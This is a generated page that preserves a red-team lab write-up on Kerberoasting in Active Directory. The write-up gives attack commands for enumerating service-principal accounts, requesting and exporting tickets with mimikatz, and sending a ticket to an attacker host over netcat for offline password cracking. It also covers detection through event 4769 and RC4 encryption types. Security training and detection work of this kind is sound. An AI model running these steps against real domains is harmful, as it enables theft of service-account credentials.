---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Kerberoasting

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-experiments-active-directory-kerberos-abuse-t1208-kerberoasting` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Kerberoasting](../../topics/offensive-security-experiments/kerberoasting.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-experiments-active-directory-kerberos-abuse-t1208-kerberoasting |
| name | Kerberoasting |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting.md |

## Preserved Source Material

````yaml
_asset_filenames:
- kerberoast-4769.png
- kerberoast-cracked.png
- kerberoast-crackstation.png
- kerberoast-creating-keytab.png
- kerberoast-decrypted.png
- kerberoast-decryptedonline.png
- kerberoast-enumeration.png
- kerberoast-exported-kerberos-tickets.png
- kerberoast-kerberos-token.png
- kerberoast-logs (1).png
- kerberoast-powershell.png
- kerberoast-principalname.png
- kerberoast-printstatements.png
- kerberoast-setspn (1).png
- kerberoast-tgs-req.png
- kerberoast-tgs-res (1).png
- kerberoast-wireshark-keytab.png
_body: "---\ndescription: Credential Access\n---\n\n# Kerberoasting\n\nThis lab explores the Kerberoasting attack - it allows\
  \ any domain user to request kerberos tickets from TGS that are encrypted with NTLM hash of the plaintext password of a\
  \ domain user account that is used as a service account (i.e account used for running an IIS service) and crack them offline\
  \ avoiding AD account lockouts.\n\n## Execution\n\nNote the vulnerable domain member - a user account with `servicePrincipalName`\
  \ attribute set, which is very important piece for kerberoasting - only user accounts with that property set are most likely\
  \ susceptible to kerberoasting:\n\n![](../../.gitbook/assets/kerberoast-principalname.png)\n\nAttacker setting up an nc\
  \ listener to receive a hash for cracking:\n\n{% code title=\"attacker@local\" %}\n```csharp\nnc -lvp 443 > kerberoast.bin\n\
  ```\n{% endcode %}\n\n### Extracting the Ticket\n\nAttacker enumerating user accounts with `serverPrincipalName` attribute\
  \ set:\n\n{% code title=\"attacker@victim\" %}\n```csharp\nGet-NetUser | Where-Object {$_.servicePrincipalName} | fl\n```\n\
  {% endcode %}\n\n![](../../.gitbook/assets/kerberoast-enumeration.png)\n\nUsing only built-in powershell, we can extract\
  \ the susceptible accounts with:\n\n```csharp\nget-adobject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname\
  \ -like \"*CN=Users*\" -and $_.cn -ne \"krbtgt\"}\n```\n\n![](../../.gitbook/assets/kerberoast-powershell.png)\n\nIt would\
  \ have been better to use the following command provided by [Sean Metcalf](https://adsecurity.org/?p=2293) purely because\
  \ of the `-filter` usage (quicker than `select-object`), but it did not work for me:\n\n```csharp\nget-adobject -filter\
  \ {serviceprincipalname -like “*sql*”} -prop serviceprincipalname\n```\n\nAnother alternative working on Linux using [bloodyAD](https://github.com/CravateRouge/bloodyAD):\n\
  \n```csharp\npython bloodyAD.py -u '$user' -p '$password' -d '$domain' --host '$host' get search --filter '(&(!(cn=krbtgt))(&(samAccountType=805306368)(servicePrincipalName=*)))'\
  \ --attr sAMAccountName | grep sAMAccountName | cut -d ' ' -f 2\n```\n\nAdditionally, user accounts with SPN set could be\
  \ extracted with a native windows binary:\n\n```\n setspn -T offense -Q */*\n```\n\n![](<../../.gitbook/assets/kerberoast-setspn\
  \ (1).png>)\n\nAttacker requesting a kerberos ticket (TGS) for a user account with `servicePrincipalName` set to `HTTP/dc-mantvydas.offense.local`-\
  \ it gets stored in the memory:\n\n{% code title=\"attacker@victim\" %}\n```csharp\nAdd-Type -AssemblyName System.IdentityModel\
  \  \nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"HTTP/dc-mantvydas.offense.local\"\
  \n```\n{% endcode %}\n\n![](../../.gitbook/assets/kerberoast-kerberos-token.png)\n\nUsing mimikatz, the attacker extracts\
  \ kerberos ticket from the memory and exports it to a file for cracking:\n\n{% code title=\"attacker@victim\" %}\n```csharp\n\
  mimikatz # kerberos::list /export\n```\n{% endcode %}\n\n![](../../.gitbook/assets/kerberoast-exported-kerberos-tickets.png)\n\
  \nAttacker sends the exported service ticket to attacking machine for offline cracking:\n\n{% code title=\"attacker@victim\"\
  \ %}\n```csharp\nnc 10.0.0.5 443 < C:\\tools\\mimikatz\\x64\\2-40a10000-spotless@HTTP~dc-mantvydas.offense.local-OFFENSE.LOCAL.kirbi\n\
  ```\n{% endcode %}\n\n### Cracking the Ticket\n\nAttacker brute forces the password of the service ticket:\n\n{% code title=\"\
  attacker@local\" %}\n```csharp\npython2 tgsrepcrack.py pwd kerberoast.bin\n```\n{% endcode %}\n\n![](../../.gitbook/assets/kerberoast-cracked.png)\n\
  \n## Observations\n\nBelow is a security log `4769` showing service access being requested:\n\n![](../../.gitbook/assets/kerberoast-4769.png)\n\
  \nIf you see `Add-event -AssemblyName SystemIdentityModel` (from advanced Powershell logging) followed by a windows security\
  \ event `4769` immediately after that, you may be looking at an old school Kerberoasting, especially if ticket encryption\
  \ type has a value `0x17` (23 decimal, meaning it's RC4 encrypted):\n\n![](<../../.gitbook/assets/kerberoast-logs (1).png>)\n\
  \n### Traffic\n\nBelow is the screenshot showing a request being sent to the `Ticket Granting Service` (TGS) for the service\
  \ with a servicePrincipalName `HTTP/dc-mantvydas.offense.local` :\n\n![](../../.gitbook/assets/kerberoast-tgs-req.png)\n\
  \nBelow is the response from the TGS for the user `spotless` (we initiated this attack from offense\\spotless) which contains\
  \ the encrypted (RC4) kerberos ticket (server part) to access the `HTTP/dc-mantvydas.offense.local` service. It is the same\
  \ ticket we cracked earlier with [tgsrepcrack.py](t1208-kerberoasting.md#cracking-the-ticket):\n\n![](<../../.gitbook/assets/kerberoast-tgs-res\
  \ (1).png>)\n\nOut of curiosity, let's decrypt the kerberos ticket since we have the password the ticket was encrypted with.\n\
  \nCreating a kerberos keytab file for use in wireshark:\n\n{% code title=\"attacker@local\" %}\n```bash\nroot@~# ktutil\
  \ \nktutil:  add_entry -password -p HTTP/iis_svc@dc-mantvydas.offense.local -k 1 -e arcfour-hmac-md5\nPassword for HTTP/iis_svc@dc-mantvydas.offense.local:\
  \ \nktutil:  wkt /root/tools/iis.keytab\n```\n{% endcode %}\n\n![](../../.gitbook/assets/kerberoast-creating-keytab.png)\n\
  \nAdding the keytab to wireshark:\n\n![](../../.gitbook/assets/kerberoast-wireshark-keytab.png)\n\nNote how the ticket's\
  \ previously encrypted piece is now in plain text and we can see information pertinent to the requested ticket for a service\
  \ `HTTP/dc-mantvydas.offense.local` :\n\n![](../../.gitbook/assets/kerberoast-decrypted.png)\n\n### tgsrepcrack.py\n\nLooking\
  \ inside the code and adding a couple of print statements in key areas of the script, we can see that the password from\
  \ the dictionary (`Passw0rd`) initially gets converted into an NTLM (`K0`) hash, then another key `K1` is derived from the\
  \ initial hash and a message type, yet another key `K2` is derived from K1 and an MD5 digest of the encrypted data. Key\
  \ `K2` is the actual key used to decrypt the encrypted ticket data:\n\n![](../../.gitbook/assets/kerberoast-crackstation.png)\n\
  \n![](../../.gitbook/assets/kerberoast-printstatements.png)\n\nI did not have to, but I also used an online RC4 decryptor\
  \ tool to confirm the above findings:\n\n![](../../.gitbook/assets/kerberoast-decryptedonline.png)\n\n{% file src=\"../../.gitbook/assets/kerberoast.pcap\"\
  \ %}\nkerberoast.pcap\n{% endfile %}\n\n## References\n\n[Tim Medin - Attacking Kerberos: Kicking the Guard Dog of Hades](https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin\\\
  (1\\).pdf)\n\n{% embed url=\"https://attack.mitre.org/wiki/Technique/T1208\" %}\n\n{% embed url=\"https://github.com/nidem/kerberoast\"\
  \ %}\n\n{% embed url=\"https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/\" %}\n\n{%\
  \ embed url=\"https://adsecurity.org/?p=2293\" %}\n\n{% embed url=\"https://www.youtube.com/watch?v=nJSMJyRNvlM&feature=youtu.be&t=16\"\
  \ %}\n\n{% embed url=\"http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/\" %}\n\n{% embed url=\"https://pentestlab.blog/2018/06/12/kerberoast/\"\
  \ %}\n\n{% embed url=\"https://blog.xpnsec.com/kerberos-attacks-part-1/\" %}\n\n{% embed url=\"https://pentestlab.blog/2018/06/12/kerberoast/\"\
  \ %}\n\n{% embed url=\"http://rc4.online-domain-tools.com/\" %}\n\n{% embed url=\"https://crackstation.net/\" %}\n\n{% embed\
  \ url=\"https://blogs.technet.microsoft.com/askds/2008/03/06/kerberos-for-the-busy-admin/\" %}\n\n{% embed url=\"https://medium.com/@jsecurity101/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec\"\
  \ %}"
_relative_path: offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting.md
````
